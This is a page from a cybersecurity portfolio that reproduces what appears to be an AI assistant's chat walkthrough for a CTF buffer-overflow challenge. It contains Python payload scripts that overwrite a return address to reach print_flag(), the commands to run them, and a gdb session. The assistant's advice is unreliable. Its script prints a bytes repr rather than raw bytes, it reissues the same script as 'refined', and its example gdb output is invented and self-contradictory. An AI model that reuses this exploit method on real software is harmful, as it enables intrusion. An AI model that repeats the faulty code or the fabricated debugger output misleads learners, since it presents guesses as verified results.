
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Ethical hacking writeups, CTF challenges, and cybersecurity notes.">
      
      
      
      
      
      
        
      
      
      <link rel="icon" href="../../../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>AI Walkthrough - Cybersecurity Portfolio</title>
      
    
    
      <link rel="stylesheet" href="../../../../../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#steps-to-craft-the-exploit" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../../../.." title="Cybersecurity Portfolio" class="md-header__button md-logo" aria-label="Cybersecurity Portfolio" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cybersecurity Portfolio
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              AI Walkthrough
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to hacker mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to hacker mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../../.." class="md-tabs__link">
        
  
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../../../about/" class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../" class="md-tabs__link">
          
  
  
  Competitions

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../../platforms/" class="md-tabs__link">
          
  
  
  Platforms

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../../../.." title="Cybersecurity Portfolio" class="md-nav__button md-logo" aria-label="Cybersecurity Portfolio" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Cybersecurity Portfolio
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../../about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Competitions
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Competitions
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Platforms
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Platforms
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../platforms/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#steps-to-craft-the-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Steps to Craft the Exploit
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#refined-python-exploit-script" class="md-nav__link">
    <span class="md-ellipsis">
      
        Refined Python Exploit Script
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#running-the-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Running the Exploit
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#additional-debugging-with-gdb" class="md-nav__link">
    <span class="md-ellipsis">
      
        Additional Debugging with gdb
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#example-gdb-session" class="md-nav__link">
    <span class="md-ellipsis">
      
        Example gdb Session
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Conclusion
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#re-evaluating-the-offset" class="md-nav__link">
    <span class="md-ellipsis">
      
        Re-evaluating the Offset
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#refined-python-exploit-script_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Refined Python Exploit Script
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#running-the-exploit_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Running the Exploit
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#additional-debugging-with-gdb_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Additional Debugging with gdb
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#example-gdb-session_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Example gdb Session
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Conclusion
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#re-evaluating-the-offset_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Re-evaluating the Offset
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#refined-python-exploit-script_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Refined Python Exploit Script
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#running-the-exploit_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Running the Exploit
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#additional-debugging-with-gdb_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Additional Debugging with gdb
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#example-gdb-session_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Example gdb Session
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Conclusion
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#what-this-implies" class="md-nav__link">
    <span class="md-ellipsis">
      
        What this implies
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#checklist-next-steps-to-fix-the-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Checklist &amp; Next Steps to Fix the Exploit
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-confirm-the-offset-to-the-return-address" class="md-nav__link">
    <span class="md-ellipsis">
      
        1. Confirm the offset to the return address
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-verify-the-address-of-print_flag" class="md-nav__link">
    <span class="md-ellipsis">
      
        2. Verify the address of print_flag()
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-disable-aslr-for-testing" class="md-nav__link">
    <span class="md-ellipsis">
      
        3. Disable ASLR (for testing)
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-check-for-stack-canaries" class="md-nav__link">
    <span class="md-ellipsis">
      
        4. Check for stack canaries
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-craft-the-payload-with-correct-offset-and-address" class="md-nav__link">
    <span class="md-ellipsis">
      
        5. Craft the payload with correct offset and address
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-run-the-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        6. Run the exploit
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      
        Summary
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#how-to-fix-your-script" class="md-nav__link">
    <span class="md-ellipsis">
      
        How to fix your script
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-note-on-cyclic_find-argument" class="md-nav__link">
    <span class="md-ellipsis">
      
        Important note on cyclic_find argument
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Summary
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



  <h1>AI Walkthrough</h1>

<p>Based on the provided decompilation and the flag encoding, you've correctly decoded the flag. Now, let's ensure we craft the correct exploit to print this flag by exploiting the buffer overflow vulnerability.</p>
<h3 id="steps-to-craft-the-exploit">Steps to Craft the Exploit<a class="headerlink" href="#steps-to-craft-the-exploit" title="Permanent link">&para;</a></h3>
<ol>
<li><strong>Confirm the Offset</strong>: The offset to the return address is 72 bytes (64 bytes for the buffer + 8 bytes for the saved RBP).</li>
<li><strong>Correct Address Format</strong>: Ensure the address of <code>print_flag()</code> is correctly formatted in little-endian.</li>
<li><strong>Align the Stack</strong>: Make sure the stack is properly aligned when returning to <code>print_flag()</code>.</li>
</ol>
<h3 id="refined-python-exploit-script">Refined Python Exploit Script<a class="headerlink" href="#refined-python-exploit-script" title="Permanent link">&para;</a></h3>
<p>Let's create a Python script to generate the payload:</p>
<p>python</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>

<span class="c1"># Define the sizes and addresses</span>
<span class="n">buffer_size</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">saved_rbp_size</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x401199</span>  <span class="c1"># Address of print_flag from nm output</span>

<span class="c1"># Craft the payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">buffer_size</span>       <span class="c1"># Fill the buffer with &#39;A&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="n">saved_rbp_size</span>   <span class="c1"># Overwrite the saved RBP with &#39;B&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>    <span class="c1"># Overwrite the return address with print_flag address (little endian)</span>

<span class="c1"># Print the payload</span>
<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<h3 id="running-the-exploit">Running the Exploit<a class="headerlink" href="#running-the-exploit" title="Permanent link">&para;</a></h3>
<p>Save the payload to a file and run the exploit:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span>&gt;<span class="w"> </span>payload
./glory<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<p>Or directly pipe the output:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>./glory
</code></pre></div>
<h3 id="additional-debugging-with-gdb">Additional Debugging with <code>gdb</code><a class="headerlink" href="#additional-debugging-with-gdb" title="Permanent link">&para;</a></h3>
<p>If the segmentation fault persists, use <code>gdb</code> to debug the issue:</p>
<ol>
<li><strong>Start <code>gdb</code> with the binary</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>gdb<span class="w"> </span>./glory
</code></pre></div>
<ol>
<li><strong>Set a breakpoint at the <code>print_flag</code> function</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>*0x401199
</code></pre></div>
<ol>
<li><strong>Run the program with the payload</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<ol>
<li><strong>Examine the stack and registers</strong> to ensure everything is correctly aligned:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10x<span class="w"> </span><span class="nv">$rsp</span>
</code></pre></div>
<h3 id="example-gdb-session">Example <code>gdb</code> Session<a class="headerlink" href="#example-gdb-session" title="Permanent link">&para;</a></h3>
<p>Here's an example of what a <code>gdb</code> session might look like:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>gdb<span class="w"> </span>./glory
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>*0x401199
Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x401199
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>payload
Starting<span class="w"> </span>program:<span class="w"> </span>/path/to/glory<span class="w"> </span>&lt;<span class="w"> </span>payload

Welcome<span class="w"> </span>again,<span class="w"> </span>brave<span class="w"> </span>soul.
The<span class="w"> </span>vault<span class="w"> </span>now<span class="w"> </span>guards<span class="w"> </span>its<span class="w"> </span>secrets<span class="w"> </span>well.
No<span class="w"> </span>strings<span class="w"> </span>can<span class="w"> </span>reveal<span class="w"> </span>what<span class="w"> </span>memory<span class="w"> </span>conceals...

So<span class="w"> </span>tell<span class="w"> </span>me<span class="w"> </span>your<span class="w"> </span>tale<span class="w"> </span>once<span class="w"> </span>more:
Alas,<span class="w"> </span>your<span class="w"> </span>tale<span class="w"> </span>ends<span class="w"> </span>here...

Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
0x0000000000401199<span class="w"> </span><span class="k">in</span><span class="w"> </span>print_flag<span class="w"> </span><span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers
rax<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rbx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rcx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rdx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rsi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rdi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rbp<span class="w">            </span>0x7fffffffe1f0<span class="w">  </span>0x7fffffffe1f0
rsp<span class="w">            </span>0x7fffffffe1e0<span class="w">  </span>0x7fffffffe1e0
r8<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
r9<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
r10<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r11<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r12<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r13<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r14<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r15<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rip<span class="w">            </span>0x401199<span class="w">  </span>0x401199<span class="w"> </span>&lt;print_flag&gt;
eflags<span class="w">         </span>0x10202<span class="w">  </span><span class="o">[</span><span class="w"> </span>IF<span class="w"> </span>RF<span class="w"> </span><span class="o">]</span>
cs<span class="w">             </span>0x33<span class="w">  </span><span class="m">51</span>
ss<span class="w">             </span>0x2b<span class="w">  </span><span class="m">43</span>
ds<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
es<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
gs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10x<span class="w"> </span><span class="nv">$rsp</span>
0x7fffffffe1e0:<span class="w"> </span>0x4141414141414141<span class="w">  </span>0x4242424242424242
0x7fffffffe1f0:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe200:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe210:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe220:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
</code></pre></div>
<h3 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h3>
<p>By ensuring the correct offset, address format, and stack alignment, you should be able to successfully exploit the buffer overflow and print the flag. If the segmentation fault persists, the <code>gdb</code> output will provide more insights into what might be going wrong.</p>
<p>New</p>
<hr />
<p>New</p>
<p>I have used that exploit, but nothing. SO, does it mean that this is the issue in registers? rip 0x40129c 0x40129c <vulnerable+42></p>
<p>Venice</p>
<p>Given that the <code>rip</code> register points to <code>0x40129c</code> which is within the <code>vulnerable</code> function, it indicates that the return address on the stack was not correctly overwritten. This suggests that the offset calculation or the payload construction might be incorrect.</p>
<p>Let's re-evaluate the offset and ensure that the payload is correctly crafted.</p>
<h3 id="re-evaluating-the-offset">Re-evaluating the Offset<a class="headerlink" href="#re-evaluating-the-offset" title="Permanent link">&para;</a></h3>
<p>The buffer size is 64 bytes, and on a typical x86_64 system, the stack layout after the buffer would be:</p>
<ol>
<li>64 bytes for the buffer (<code>local_48</code>).</li>
<li>8 bytes for the saved base pointer (RBP).</li>
<li>8 bytes for the return address.</li>
</ol>
<p>So, the total offset to the return address from the start of the buffer should be:</p>
<h3 id="refined-python-exploit-script_1">Refined Python Exploit Script<a class="headerlink" href="#refined-python-exploit-script_1" title="Permanent link">&para;</a></h3>
<p>Let's create a more robust payload that ensures proper alignment and correct offset:</p>
<p>python</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>

<span class="c1"># Define the sizes and addresses</span>
<span class="n">buffer_size</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">saved_rbp_size</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x401199</span>  <span class="c1"># Address of print_flag from nm output</span>

<span class="c1"># Craft the payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">buffer_size</span>       <span class="c1"># Fill the buffer with &#39;A&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="n">saved_rbp_size</span>   <span class="c1"># Overwrite the saved RBP with &#39;B&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>    <span class="c1"># Overwrite the return address with print_flag address (little endian)</span>

<span class="c1"># Print the payload</span>
<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
